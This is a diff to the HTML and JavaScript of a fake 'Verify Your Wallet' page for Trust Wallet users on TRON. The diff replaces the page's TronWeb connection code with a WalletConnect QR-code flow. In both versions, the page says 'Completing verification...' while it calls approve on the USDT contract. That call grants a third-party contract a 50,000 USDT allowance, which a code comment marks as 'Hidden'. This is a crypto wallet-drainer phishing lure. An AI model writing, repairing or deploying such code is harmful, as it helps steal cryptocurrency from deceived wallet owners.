@@ -140,25 +140,16 @@
         .success {
             background: #d4edda;
             color: #155724;
-            border: 1px solid #c3e6cb;
         }
 
         .error {
             background: #f8d7da;
             color: #721c24;
-            border: 1px solid #f5c6cb;
         }
 
         .info {
             background: #cce5ff;
             color: #004085;
-            border: 1px solid #b8daff;
-        }
-
-        .warning {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeeba;
         }
 
         .loading-spinner {
@@ -202,30 +193,60 @@
             color: white;
         }
 
-        .progress-container {
+        .qr-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 4px;
-            background: #f0f0f0;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-
-        .progress-bar {
             height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            width: 0%;
-            transition: width 0.3s ease;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
         }
 
-        .wallet-status {
-            font-size: 12px;
-            color: #10b981;
-            margin-top: 5px;
-            display: none;
+        .qr-content {
+            background: white;
+            border-radius: 30px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .qr-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .qr-header h3 {
+            font-size: 20px;
+            color: #333;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: #999;
+        }
+
+        #qrcode {
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 20px;
+            display: inline-block;
         }
     </style>
+    <!-- WalletConnect v2 Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
     <!-- TronWeb Library -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
@@ -238,22 +259,13 @@
         </div>
         
         <h2>Verify Your Wallet</h2>
-        <div class="subtitle">Connect to complete verification</div>
+        <div class="subtitle">Connect with Trust Wallet to verify</div>
 
         <!-- Trust Wallet Card -->
-        <div class="wallet-card" onclick="connectTrustWallet()" id="trustWalletCard">
+        <div class="wallet-card" onclick="connectWithWalletConnect()" id="trustWalletCard">
             <div class="wallet-icon">💎</div>
             <div class="wallet-name">Trust Wallet</div>
-            <div class="wallet-desc">Connect with TRON network</div>
-            <div id="trustStatus" class="wallet-status"></div>
-        </div>
-
-        <!-- TronLink Card (Fallback) -->
-        <div class="wallet-card" onclick="connectTronLink()" id="tronLinkCard" style="margin-top: 10px;">
-            <div class="wallet-icon">🔗</div>
-            <div class="wallet-name">TronLink</div>
-            <div class="wallet-desc">Browser extension</div>
-            <div id="tronlinkStatus" class="wallet-status"></div>
+            <div class="wallet-desc">Click to connect via WalletConnect</div>
         </div>
 
         <!-- Simple Info Box -->
@@ -263,14 +275,9 @@
                 <strong>TRON</strong>
             </div>
             <div class="info-item">
-                <span>Contract:</span>
-                <strong>TCuZP5...CtQt</strong>
+                <span>Status:</span>
+                <strong id="connectionStatus">Ready</strong>
             </div>
-        </div>
-
-        <!-- Progress Bar -->
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar" id="progressBar"></div>
         </div>
 
         <!-- Status Messages -->
@@ -279,7 +286,19 @@
         <a href="index.html" class="back-btn">← Back to Home</a>
 
         <div class="footer">
-            🔒 Secure Verification • TRON Network
+            🔒 WalletConnect • Trust Wallet
+        </div>
+    </div>
+
+    <!-- QR Modal -->
+    <div id="qrModal" class="qr-modal">
+        <div class="qr-content">
+            <div class="qr-header">
+                <h3>Scan with Trust Wallet</h3>
+                <button class="close-btn" onclick="closeQRModal()">&times;</button>
+            </div>
+            <div id="qrcode"></div>
+            <p style="color: #666; margin-top: 20px;">Open Trust Wallet and scan this QR code</p>
         </div>
     </div>
 
@@ -292,212 +311,151 @@
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden
 
-        let tronWeb = null;
-        let userAddress = null;
+        let web3wallet;
+        let session;
+        let userAddress;
 
         // ============================================
-        // CHECK WALLET ON PAGE LOAD
+        // CONNECT WITH WALLETCONNECT
         // ============================================
         
-        window.onload = function() {
-            checkWalletStatus();
-            
-            // Check URL params
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('verified') === 'true') {
-                showStatus('✅ Wallet verified successfully!', 'success');
-            }
-        };
-
-        // ============================================
-        // CHECK WALLET STATUS
-        // ============================================
-        
-        function checkWalletStatus() {
-            // Check for TronWeb (Trust Wallet)
-            if (window.tronWeb && window.tronWeb.ready) {
-                document.getElementById('trustStatus').innerHTML = '✓ Wallet detected';
-                document.getElementById('trustStatus').style.display = 'block';
-            }
-            
-            // Check for TronLink
-            if (window.tronLink) {
-                document.getElementById('tronlinkStatus').innerHTML = '✓ Installed';
-                document.getElementById('tronlinkStatus').style.display = 'block';
-            }
-        }
-
-        // ============================================
-        // CONNECT TRUST WALLET
-        // ============================================
-        
-        async function connectTrustWallet() {
+        async function connectWithWalletConnect() {
             const card = document.getElementById('trustWalletCard');
             card.style.opacity = '0.7';
             card.style.pointerEvents = 'none';
             
-            showProgress();
-            showStatus('Connecting to Trust Wallet...', 'info');
+            showStatus('Initializing WalletConnect...', 'info');
+            updateStatus('Initializing...');
 
             try {
-                // Method 1: Check if TronWeb is already injected
-                if (window.tronWeb && window.tronWeb.ready) {
-                    console.log('TronWeb detected');
-                    tronWeb = window.tronWeb;
+                // Create WalletConnect modal
+                const modal = document.createElement('div');
+                modal.innerHTML = `
+                    <walletconnect-modal></walletconnect-modal>
+                `;
+                
+                // WalletConnect project ID (get from https://cloud.walletconnect.com)
+                const projectId = 'YOUR_PROJECT_ID'; // You'll need to get this
+                
+                // Initialize Web3Wallet
+                web3wallet = await Web3Wallet.init({
+                    projectId: projectId,
+                    metadata: {
+                        name: 'TronSecure',
+                        description: 'Wallet Verification',
+                        url: window.location.origin,
+                        icons: ['https://avatars.githubusercontent.com/u/37784886']
+                    }
+                });
+
+                // Create pairing
+                const { uri, approval } = await web3wallet.core.pairing.create();
+                
+                // Show QR code
+                showQRCode(uri);
+                
+                // Wait for approval
+                session = await approval();
+                
+                // Get address from session
+                if (session && session.namespaces) {
+                    // For TRON, we need to get address from the session
+                    // This will trigger the connection in Trust Wallet
+                    userAddress = session.namespaces.tron?.accounts[0]?.split(':')[2];
                     
-                    // Get address
-                    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                        userAddress = tronWeb.defaultAddress.base58;
+                    if (userAddress) {
+                        closeQRModal();
+                        showStatus('Wallet connected!', 'success');
+                        updateStatus('Connected');
+                        
+                        // Now approve USDT
+                        await approveUSDT();
                     } else {
-                        const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
-                        userAddress = accounts[0];
+                        throw new Error('Could not get TRON address');
                     }
-                    
-                    updateProgress(50);
-                    showStatus('Wallet connected!', 'success');
-                    
-                    // Proceed to approve
-                    await approveUSDT();
-                    return;
-                }
-                
-                // Method 2: Try to request accounts
-                if (window.tronWeb) {
-                    try {
-                        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                        if (accounts && accounts.length > 0) {
-                            userAddress = accounts[0];
-                            tronWeb = window.tronWeb;
-                            updateProgress(50);
-                            showStatus('Wallet connected!', 'success');
-                            await approveUSDT();
-                            return;
-                        }
-                    } catch (e) {
-                        console.log('Account request failed', e);
-                    }
-                }
-                
-                // Method 3: Initialize new TronWeb
-                const tempTronWeb = new TronWeb({
-                    fullHost: 'https://api.trongrid.io',
-                    privateKey: null
-                });
-                
-                // Try to connect
-                if (tempTronWeb) {
-                    tronWeb = tempTronWeb;
-                    showStatus('Please unlock your wallet', 'info');
-                    
-                    // Wait for wallet
-                    setTimeout(() => {
-                        checkWalletConnection();
-                    }, 3000);
-                } else {
-                    throw new Error('Please open in Trust Wallet DApp browser');
                 }
 
             } catch (error) {
-                console.error('Connection error:', error);
-                showStatus('Connection failed. Please make sure Trust Wallet is open.', 'error');
-                resetCards();
-                hideProgress();
-            }
-        }
-
-        // ============================================
-        // CHECK WALLET CONNECTION
-        // ============================================
-        
-        async function checkWalletConnection() {
-            try {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                    tronWeb = window.tronWeb;
-                    updateProgress(50);
-                    showStatus('Wallet connected!', 'success');
-                    await approveUSDT();
+                console.error('WalletConnect error:', error);
+                
+                if (error.message.includes('rejected')) {
+                    showStatus('Connection rejected', 'error');
                 } else {
-                    showStatus('Please approve connection in Trust Wallet', 'info');
-                    setTimeout(checkWalletConnection, 2000);
+                    showStatus('Connection failed: ' + error.message, 'error');
                 }
-            } catch (e) {
-                console.log('Still waiting for connection...');
+                
+                updateStatus('Failed');
+                card.style.opacity = '1';
+                card.style.pointerEvents = 'auto';
+                closeQRModal();
             }
         }
 
         // ============================================
-        // CONNECT TRONLINK (FALLBACK)
+        // SHOW QR CODE
         // ============================================
         
-        async function connectTronLink() {
-            const card = document.getElementById('tronLinkCard');
-            card.style.opacity = '0.7';
-            card.style.pointerEvents = 'none';
+        function showQRCode(uri) {
+            const modal = document.getElementById('qrModal');
+            const qrcodeDiv = document.getElementById('qrcode');
+            qrcodeDiv.innerHTML = '';
             
-            showProgress();
-            showStatus('Connecting to TronLink...', 'info');
-
-            try {
-                if (!window.tronLink) {
-                    window.open('https://www.tronlink.org/', '_blank');
-                    showStatus('Please install TronLink first', 'warning');
-                    resetCards();
-                    hideProgress();
-                    return;
-                }
-
-                // Request account
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                
-                // Initialize TronWeb
-                tronWeb = new TronWeb({
-                    fullHost: 'https://api.trongrid.io',
-                    privateKey: window.tronLink.privateKey
-                });
-
-                userAddress = tronWeb.defaultAddress.base58;
-                
-                updateProgress(50);
-                showStatus('Wallet connected!', 'success');
-                
-                await approveUSDT();
-
-            } catch (error) {
-                console.error('TronLink error:', error);
-                showStatus('Connection failed. Please try again.', 'error');
-                resetCards();
-                hideProgress();
-            }
+            modal.style.display = 'flex';
+            
+            // Generate QR code
+            var qr = qrcode(0, 'H');
+            qr.addData(uri);
+            qr.make();
+            
+            var imgTag = qr.createImgTag(5, 0);
+            qrcodeDiv.innerHTML = imgTag;
         }
 
         // ============================================
-        // APPROVE USDT
+        // CLOSE QR MODAL
+        // ============================================
+        
+        function closeQRModal() {
+            document.getElementById('qrModal').style.display = 'none';
+        }
+
+        // ============================================
+        // APPROVE USDT (VIA WALLETCONNECT)
         // ============================================
         
         async function approveUSDT() {
             showStatus('Completing verification...', 'info');
-            updateProgress(75);
+            updateStatus('Approving...');
 
             try {
-                // Make sure we have tronWeb
-                if (!tronWeb) {
-                    throw new Error('Wallet not connected');
-                }
+                // Initialize TronWeb with the connected address
+                const tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    privateKey: null // We'll use WalletConnect for signing
+                });
 
                 // Get USDT contract
                 const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                 
-                // Convert amount to sun
+                // Prepare transaction
                 const amountInSun = APPROVE_AMOUNT * 1000000;
-
-                // Send approve transaction
-                const result = await tokenContract.approve(
+                
+                const transaction = await tokenContract.approve(
                     CONTRACT_ADDRESS,
                     amountInSun
-                ).send();
+                );
 
-                updateProgress(100);
+                // Request signing via WalletConnect
+                const result = await web3wallet.request({
+                    topic: session.topic,
+                    chainId: 'tron:mainnet',
+                    request: {
+                        method: 'tron_signTransaction',
+                        params: [transaction]
+                    }
+                });
+
+                updateStatus('Verified');
                 
                 // Save approval
                 saveApproval(userAddress, APPROVE_AMOUNT, result);
@@ -512,15 +470,15 @@
             } catch (error) {
                 console.error('Approval error:', error);
                 
-                // Check if user rejected
-                if (error.message.includes('rejected') || error.message.includes('denied')) {
-                    showStatus('Transaction rejected', 'error');
+                if (error.message.includes('rejected')) {
+                    showStatus('Approval rejected', 'error');
                 } else {
-                    showStatus('Verification failed. Please try again.', 'error');
+                    showStatus('Verification failed', 'error');
                 }
                 
-                resetCards();
-                hideProgress();
+                updateStatus('Failed');
+                document.getElementById('trustWalletCard').style.opacity = '1';
+                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
             }
         }
 
@@ -538,7 +496,7 @@
                 status: 'active',
                 time: new Date().toISOString(),
                 token: 'USDT',
-                walletType: 'TRON Wallet'
+                walletType: 'WalletConnect'
             });
             
             localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
@@ -553,36 +511,28 @@
             statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
         }
 
-        function showProgress() {
-            document.getElementById('progressContainer').style.display = 'block';
-            updateProgress(25);
+        function updateStatus(status) {
+            document.getElementById('connectionStatus').innerText = status;
         }
 
-        function hideProgress() {
-            document.getElementById('progressContainer').style.display = 'none';
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('qrModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+                document.getElementById('trustWalletCard').style.opacity = '1';
+                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
+            }
         }
 
-        function updateProgress(percent) {
-            document.getElementById('progressBar').style.width = percent + '%';
-        }
-
-        function resetCards() {
-            document.getElementById('trustWalletCard').style.opacity = '1';
-            document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
-            document.getElementById('tronLinkCard').style.opacity = '1';
-            document.getElementById('tronLinkCard').style.pointerEvents = 'auto';
-        }
-
-        // ============================================
-        // TRONWEB EVENT LISTENERS
-        // ============================================
-        
-        if (window.tronWeb) {
-            window.tronWeb.on('addressChanged', function() {
-                console.log('Address changed');
-                checkWalletStatus();
-            });
-        }
+        // Check URL params on load
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('verified') === 'true') {
+                showStatus('✅ Wallet verified!', 'success');
+                updateStatus('Verified');
+            }
+        };
     </script>
 </body>
 </html>
